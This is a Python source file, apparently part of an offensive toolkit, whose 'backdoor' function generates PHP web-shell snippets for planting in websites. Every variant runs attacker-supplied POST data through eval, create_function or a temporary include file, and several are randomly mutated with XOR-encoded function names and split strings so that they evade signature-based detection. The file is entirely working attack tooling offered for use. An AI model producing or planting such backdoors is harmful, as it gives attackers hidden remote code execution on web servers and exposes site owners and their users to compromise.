import secrets
import modules.send as send
import base64
import random
import configparser

def backdoor(ts,Zc,Vc):
    if ts == "bypass":
        x = secrets.token_hex(2)
        if x[0].isdigit(): 
            while x[0].isdigit():x = secrets.token_hex(2)

        text = 'create_function'
        chars = secrets.token_urlsafe(2)
        many = random.randint(1,3)
        listOne = chars.join([text[i:i+many] for i in range(0, len(text),many)])
        structure = random.randint(1,4)
        match structure:
            case 1: 
                start = 'if(isset($_POST[\''+Zc+'\'])){'
                end2 = '}'
            case 2:
                start = 'do{'
                end2 = 'break;}while(isset($_POST[\''+Zc+'\']));'
            case 3:
                start = 'while(isset($_POST[\''+Zc+'\'])){'
                end2 = 'break;}'
            case 4:
                start = 'for(isset($_POST[\''+Zc+'\']);;){'
                end2 = 'break;}'
    
        first = random.randint(1,6)
        match first:
            case 1: str1 = '$'+x+' = str_replace(\''+chars+ '\',\'\',\''+listOne+'\')'
            case 2: str1 = '$'+x+' = ("jRp4RiOHgeG"^"cglYOHetARC"^"zAn2oDZPGTa")(\''+chars+ '\',\'\',\''+listOne+'\')'
            case 3: str1 = '$'+x+' = strtr("'+listOne+'", array("'+chars+ '" =>""))'
            case 4: str1 = '$'+x+' = ("3NBQA"^"7xsKi"^"wBCnZ")("'+listOne+'", array("'+chars+ '" =>""))'
            case 5: str1 = '$'+x+' = preg_replace("/'+chars+'/","","'+listOne+'")'
            case 6: str1 = '$'+x+' = ("HeAcQfTChEyS"^"roGfIBCkNHxy"^"JxcbGVrXJlbO")("/'+chars+'/","","'+listOne+'")'
    
        basesf = random.randint(1,2)
        match basesf:
            case 1: b64 = '(\'\',base64_decode'
            case 2: b64 = '(\'\',("wBnttPJWhudVy"^"OATvw1TwONBxp"^"ZbIg5UADBXIJl")'
    
        second = random.randint(1,4)
        match second:
            case 1 : str2 = '(str_replace($_POST[\''+Vc+'\'],\'\',$_POST[\''+Zc+'\'])));'
            case 2 : str2 = '(("jRp4RiOHgeG"^"cglYOHetARC"^"zAn2oDZPGTa")($_POST[\''+Vc+'\'],\'\',$_POST[\''+Zc+'\'])));'
            case 3 : str2 = '(strtr($_POST[\''+Zc+'\'], array($_POST[\''+Vc+'\'] => \'\'))));'
            case 4 : str2 = '(("3NBQA"^"7xsKi"^"wBCnZ")($_POST[\''+Zc+'\'], array($_POST[\''+Vc+'\'] => \'\'))));'
    
            # case 1 : str2 = '(str_replace($_POST[\'V\'],\'\',$_POST[\'Z\'])));'
            # case 2 : str2 = '(("jRp4RiOHgeG"^"cglYOHetARC"^"zAn2oDZPGTa")($_POST[\'V\'],\'\',$_POST[\'Z\'])));'
            # case 3 : str2 = '(strtr($_POST[\'Z\'], array($_POST[\'V\'] => \'\'))));'
            # case 4 : str2 = '(("3NBQA"^"7xsKi"^"wBCnZ")($_POST[\'Z\'], array($_POST[\'V\'] => \'\'))));'
    
            # case 5 : str2 = '(preg_replace("/".$_REQUEST[\'V\']."/","",$_REQUEST[\'Z\'])));'
            # case 6 : str2 = '(("HeAcQfTChEyS"^"roGfIBCkNHxy"^"JxcbGVrXJlbO")("/".$_REQUEST[\'V\']."/","",$_REQUEST[\'Z\'])));'
    
        end = '$'+x+'();die();'
        clasic = '''if(isset($_POST[\''''+Zc+'''\'])){@eval(base64_decode(str_replace($_POST[\''''+Vc+'''\'],'',$_POST[\''''+Zc+'''\'])));die();}'''
        tmp ='''if(isset($_POST[\''''+Zc+'''\'])){$f=tempnam(sys_get_temp_dir(),'');file_put_contents($f,"<?php \\n".base64_decode(str_replace($_POST[\''''+Vc+'''\'],'',$_POST[\''''+Zc+'''\']))."\\n ?>");include_once($f);unlink($f);die();}'''
        full1 = '''if(isset($_REQUEST[\''''+Zc+'''\'])){ $x = create_function('',base64_decode(str_replace($_POST[\''''+Vc+'''\'],'',$_POST[\''''+Zc+'''\']));$x();die();}'''
        full2 = start+str1+b64+str2+end+end2

        print("Classic: \n"+clasic+"\n")
        print("TMP-include eval bypass:\n"+tmp+"\n")
        print("Function Bypass (clear): \n"+full1+"\n")
        print("Function Bypass (mutated): \n"+full2+"\n")

    if ts in ("classic","simple"):
        x = secrets.token_hex(2)
        if x[0].isdigit(): 
            while x[0].isdigit():x = secrets.token_hex(2)

        text = 'create_function'
        chars = secrets.token_urlsafe(2)
        many = random.randint(1,3)
        listOne = chars.join([text[i:i+many] for i in range(0, len(text),many)])
        structure = random.randint(1,4)
        match structure:
            case 1: 
                start = 'if(isset($_POST[\''+Zc+'\'])){'
                end2 = '}'
            case 2:
                start = 'do{'
                end2 = 'break;}while(isset($_POST[\''+Zc+'\']));'
            case 3:
                start = 'while(isset($_POST[\''+Zc+'\'])){'
                end2 = 'break;}'
            case 4:
                start = 'for(isset($_POST[\''+Zc+'\']);;){'
                end2 = 'break;}'
    
        first = random.randint(1,6)
        match first:
            case 1: str1 = '$'+x+' = str_replace(\''+chars+ '\',\'\',\''+listOne+'\')'
            case 2: str1 = '$'+x+' = ("jRp4RiOHgeG"^"cglYOHetARC"^"zAn2oDZPGTa")(\''+chars+ '\',\'\',\''+listOne+'\')'
            case 3: str1 = '$'+x+' = strtr("'+listOne+'", array("'+chars+ '" =>""))'
            case 4: str1 = '$'+x+' = ("3NBQA"^"7xsKi"^"wBCnZ")("'+listOne+'", array("'+chars+ '" =>""))'
            case 5: str1 = '$'+x+' = preg_replace("/'+chars+'/","","'+listOne+'")'
            case 6: str1 = '$'+x+' = ("HeAcQfTChEyS"^"roGfIBCkNHxy"^"JxcbGVrXJlbO")("/'+chars+'/","","'+listOne+'")'
    
        b64 = '(\'\','
        str2 = '$_POST[\''+Vc+'\']);'

        end = '$'+x+'();die();'

        clasic = '''if(isset($_POST[\''''+Zc+'''\'])){@eval($_POST[\''''+Zc+'''\']);die();}'''
        tmp ='''if(isset($_POST[\''''+Zc+'''\'])){$f=tempnam(sys_get_temp_dir(),'');file_put_contents($f,"<?php \\n".$_POST[\''''+Zc+'''\']."\\n ?>");include_once($f);unlink($f);die();}'''
        full1 = '''if(isset($_POST[\''''+Zc+'''\']])){ $x = create_function('',$_POST[\''''+Zc+'''\']]);$x();die();}'''
        full2 = start+str1+b64+str2+end+end2

        print("Classic: \n"+clasic+"\n")
        print("TMP-include eval bypass:\n"+tmp+"\n")
        print("Function Bypass (clear): \n"+full1+"\n")
        print("Function Bypass (mutated): \n"+full2+"\n")